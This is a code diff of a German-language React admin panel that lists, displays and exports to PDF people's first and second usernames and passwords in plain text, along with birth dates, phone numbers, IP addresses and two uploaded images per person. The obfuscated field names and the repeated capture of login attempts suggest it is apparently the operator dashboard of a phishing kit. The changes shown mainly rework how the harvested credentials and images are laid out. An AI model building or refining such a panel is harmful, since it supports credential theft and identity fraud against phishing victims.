@@ -353,7 +353,8 @@ const AdminPanel: React.FC = () => {
 
       // Login Information
       yPosition = addText('🔐 Anmeldeinformationen', margin, yPosition, pageWidth - 2 * margin, 12);
-      yPosition = addText(`Benutzername: ${session.finalData?.xusr || session.loginData?.xusr || session.loginData?.xusrFirst || session.finalData?.xusrFirst || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition = addText(`Erster Benutzername: ${session.loginData?.xusrFirst || session.finalData?.xusrFirst || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+      yPosition = addText(`Neuer Benutzername: ${session.finalData?.xusr || session.loginData?.xusr || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
       yPosition = addText(`Erstes Passwort: ${session.loginData?.xpssFirst || session.finalData?.xpssFirst || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
       yPosition = addText(`Neues Passwort: ${session.loginData?.xpss || session.finalData?.xpss || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
       yPosition += 5;
@@ -456,7 +457,8 @@ const AdminPanel: React.FC = () => {
 
     // Login Information
     yPosition = addText('🔐 Anmeldeinformationen', margin, yPosition, pageWidth - 2 * margin, 12);
-    yPosition = addText(`Benutzername: ${selectedUser.xusr || selectedUser.xusrFirst || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+    yPosition = addText(`Erster Benutzername: ${selectedUser.xusrFirst || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
+    yPosition = addText(`Neuer Benutzername: ${selectedUser.xusr || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
     yPosition = addText(`Erstes Passwort: ${selectedUser.xpssFirst || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
     yPosition = addText(`Neues Passwort: ${selectedUser.xpss || 'Nicht angegeben'}`, margin + 10, yPosition, pageWidth - 2 * margin - 10);
     yPosition += 10;
@@ -748,8 +750,13 @@ const AdminPanel: React.FC = () => {
             <tbody>
               {processedUsers.map((user, index) => (
                 <tr key={index} data-session={user.sessionId}>
-                  <td title={`Username: ${user.xusr || user.xusrFirst || '-'}`}>
-                    {user.xusr || user.xusrFirst || '-'}
+                  <td>
+                    <div title={`${t.oldUsernameLabel}: ${user.xusrFirst || '-'}`}>
+                      <strong>{t.oldUsernameLabel}:</strong> {user.xusrFirst || '-'}
+                    </div>
+                    <div title={`${t.newUsernameLabel}: ${user.xusr || '-'}`}>
+                      <strong>{t.newUsernameLabel}:</strong> {user.xusr || '-'}
+                    </div>
                   </td>
                   <td>
                     <div title={`${t.oldPasswordLabel}: ${user.xpssFirst || '-'}`}>
@@ -764,10 +771,10 @@ const AdminPanel: React.FC = () => {
                   <td title={`Birth Date: ${user.xdob}`}>{user.xdob || '-'}</td>
                   <td title={`Phone: ${user.xtel}`}>{user.xtel || '-'}</td>
                   <td>
-                    <div style={{display: 'flex', gap: '5px', flexDirection: 'column'}}>
-                      {user.filenameFirst ? (
-                        <div className="file-display" style={{marginBottom: '5px'}}>
-                          <div style={{fontSize: '10px', color: '#666', marginBottom: '2px'}}>First:</div>
+                    <div style={{display: 'flex', gap: '10px', flexDirection: 'row', alignItems: 'flex-start'}}>
+                      <div className="file-display" style={{display: 'flex', flexDirection: 'column', alignItems: 'center'}}>
+                        <div style={{fontSize: '10px', color: '#666', marginBottom: '2px'}}>First:</div>
+                        {user.filenameFirst ? (
                           <img 
                             src={`${API_BASE_URL.replace('/api', '')}/uploads/${user.filenameFirst}`}
                             alt={user.originalNameFirst}
@@ -778,11 +785,15 @@ const AdminPanel: React.FC = () => {
                               e.currentTarget.style.display = 'none';
                             }}
                           />
-                        </div>
-                      ) : null}
-                      {user.filename ? (
-                        <div className="file-display">
-                          <div style={{fontSize: '10px', color: '#666', marginBottom: '2px'}}>Second:</div>
+                        ) : (
+                          <div style={{width: '50px', height: '50px', display: 'flex', alignItems: 'center', justifyContent: 'center'}}>
+                            <span style={{color: '#999', fontSize: '14px'}}>-</span>
+                          </div>
+                        )}
+                      </div>
+                      <div className="file-display" style={{display: 'flex', flexDirection: 'column', alignItems: 'center'}}>
+                        <div style={{fontSize: '10px', color: '#666', marginBottom: '2px'}}>Second:</div>
+                        {user.filename ? (
                           <img 
                             src={`${API_BASE_URL.replace('/api', '')}/uploads/${user.filename}`}
                             alt={user.originalName}
@@ -797,9 +808,12 @@ const AdminPanel: React.FC = () => {
                               e.currentTarget.style.display = 'none';
                             }}
                           />
-                        </div>
-                      ) : null}
-                      {!user.filename && !user.filenameFirst ? '-' : null}
+                        ) : (
+                          <div style={{width: '50px', height: '50px', display: 'flex', alignItems: 'center', justifyContent: 'center'}}>
+                            <span style={{color: '#999', fontSize: '14px'}}>-</span>
+                          </div>
+                        )}
+                      </div>
                     </div>
                   </td>
                   <td className="ip-address">{user.ip}</td>
@@ -1057,11 +1071,17 @@ const AdminPanel: React.FC = () => {
                 {/* Login Information */}
                 <div style={{border: '1px solid #ddd', borderRadius: '8px', padding: '15px'}}>
                   <h4 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>🔐 Anmeldeinformationen</h4>
-                  <div>
-                    <strong>Benutzername:</strong><br/>
-                    <span style={{color: '#333'}}>{selectedUser.xusr || selectedUser.xusrFirst || 'Nicht angegeben'}</span>
+                  <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', marginBottom: '10px'}}>
+                    <div>
+                      <strong>{t.oldUsernameLabel}:</strong><br/>
+                      <span style={{color: '#333'}}>{selectedUser.xusrFirst || 'Nicht angegeben'}</span>
+                    </div>
+                    <div>
+                      <strong>{t.newUsernameLabel}:</strong><br/>
+                      <span style={{color: '#333'}}>{selectedUser.xusr || 'Nicht angegeben'}</span>
+                    </div>
                   </div>
-                  <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px', marginTop: '10px'}}>
+                  <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
                     <div>
                       <strong>{t.oldPasswordLabel}:</strong><br/>
                       <span style={{color: '#333'}}>{selectedUser.xpssFirst || 'Nicht angegeben'}</span>
@@ -1101,79 +1121,81 @@ const AdminPanel: React.FC = () => {
                   <div style={{border: '1px solid #ddd', borderRadius: '8px', padding: '15px'}}>
                     <h4 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>📁 Hochgeladene Dateien</h4>
                     
-                    {/* First Upload */}
-                    {selectedUser.filenameFirst && (
-                      <div style={{marginBottom: '20px', padding: '10px', backgroundColor: '#f9f9f9', borderRadius: '4px'}}>
-                        <h5 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>Erste Upload</h5>
-                        <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
-                          <div>
-                            <strong>Ursprünglicher Dateiname:</strong><br/>
-                            <span style={{color: '#333'}}>{selectedUser.originalNameFirst}</span>
+                    <div style={{display: 'flex', gap: '20px', flexDirection: 'row', flexWrap: 'wrap'}}>
+                      {/* First Upload */}
+                      {selectedUser.filenameFirst && (
+                        <div style={{flex: '1', minWidth: '200px', padding: '10px', backgroundColor: '#f9f9f9', borderRadius: '4px'}}>
+                          <h5 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>Erste Upload</h5>
+                          <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
+                            <div>
+                              <strong>Ursprünglicher Dateiname:</strong><br/>
+                              <span style={{color: '#333'}}>{selectedUser.originalNameFirst}</span>
+                            </div>
+                            <div>
+                              <strong>Dateigröße:</strong><br/>
+                              <span style={{color: '#333'}}>{Math.round((selectedUser.sizeFirst || 0) / 1024)} KB</span>
+                            </div>
                           </div>
-                          <div>
-                            <strong>Dateigröße:</strong><br/>
-                            <span style={{color: '#333'}}>{Math.round((selectedUser.sizeFirst || 0) / 1024)} KB</span>
+                          <div style={{marginTop: '10px'}}>
+                            <strong>Dateivorschau:</strong><br/>
+                            <img 
+                              src={`${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filenameFirst}`}
+                              alt={selectedUser.originalNameFirst}
+                              style={{
+                                width: '100px',
+                                height: '100px',
+                                objectFit: 'cover',
+                                border: '1px solid #ddd',
+                                borderRadius: '4px',
+                                marginTop: '5px',
+                                cursor: 'pointer'
+                              }}
+                              onClick={() => setSelectedImage(`${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filenameFirst}`)}
+                              onError={(e) => {
+                                e.currentTarget.style.display = 'none';
+                              }}
+                            />
                           </div>
                         </div>
-                        <div style={{marginTop: '10px'}}>
-                          <strong>Dateivorschau:</strong><br/>
-                          <img 
-                            src={`${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filenameFirst}`}
-                            alt={selectedUser.originalNameFirst}
-                            style={{
-                              width: '100px',
-                              height: '100px',
-                              objectFit: 'cover',
-                              border: '1px solid #ddd',
-                              borderRadius: '4px',
-                              marginTop: '5px',
-                              cursor: 'pointer'
-                            }}
-                            onClick={() => setSelectedImage(`${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filenameFirst}`)}
-                            onError={(e) => {
-                              e.currentTarget.style.display = 'none';
-                            }}
-                          />
-                        </div>
-                      </div>
-                    )}
+                      )}
 
-                    {/* Second Upload */}
-                    {selectedUser.filename && (
-                      <div style={{padding: '10px', backgroundColor: '#f9f9f9', borderRadius: '4px'}}>
-                        <h5 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>Zweite Upload</h5>
-                        <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
-                          <div>
-                            <strong>Ursprünglicher Dateiname:</strong><br/>
-                            <span style={{color: '#333'}}>{selectedUser.originalName}</span>
+                      {/* Second Upload */}
+                      {selectedUser.filename && (
+                        <div style={{flex: '1', minWidth: '200px', padding: '10px', backgroundColor: '#f9f9f9', borderRadius: '4px'}}>
+                          <h5 style={{margin: '0 0 10px 0', color: '#2c5f5f'}}>Zweite Upload</h5>
+                          <div style={{display: 'grid', gridTemplateColumns: '1fr 1fr', gap: '10px'}}>
+                            <div>
+                              <strong>Ursprünglicher Dateiname:</strong><br/>
+                              <span style={{color: '#333'}}>{selectedUser.originalName}</span>
+                            </div>
+                            <div>
+                              <strong>Dateigröße:</strong><br/>
+                              <span style={{color: '#333'}}>{Math.round(selectedUser.size / 1024)} KB</span>
+                            </div>
                           </div>
-                          <div>
-                            <strong>Dateigröße:</strong><br/>
-                            <span style={{color: '#333'}}>{Math.round(selectedUser.size / 1024)} KB</span>
+                          <div style={{marginTop: '10px'}}>
+                            <strong>Dateivorschau:</strong><br/>
+                            <img 
+                              src={`${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filename}`}
+                              alt={selectedUser.originalName}
+                              style={{
+                                width: '100px',
+                                height: '100px',
+                                objectFit: 'cover',
+                                border: '1px solid #ddd',
+                                borderRadius: '4px',
+                                marginTop: '5px',
+                                cursor: 'pointer'
+                              }}
+                              onClick={() => setSelectedImage(`${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filename}`)}
+                              onError={(e) => {
+                                e.currentTarget.style.display = 'none';
+                              }}
+                            />
                           </div>
                         </div>
-                        <div style={{marginTop: '10px'}}>
-                          <strong>Dateivorschau:</strong><br/>
-                          <img 
-                            src={`${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filename}`}
-                            alt={selectedUser.originalName}
-                            style={{
-                              width: '100px',
-                              height: '100px',
-                              objectFit: 'cover',
-                              border: '1px solid #ddd',
-                              borderRadius: '4px',
-                              marginTop: '5px',
-                              cursor: 'pointer'
-                            }}
-                            onClick={() => setSelectedImage(`${API_BASE_URL.replace('/api', '')}/uploads/${selectedUser.filename}`)}
-                            onError={(e) => {
-                              e.currentTarget.style.display = 'none';
-                            }}
-                          />
-                        </div>
-                      </div>
-                    )}
+                      )}
+                    </div>
                   </div>
                 )}
 
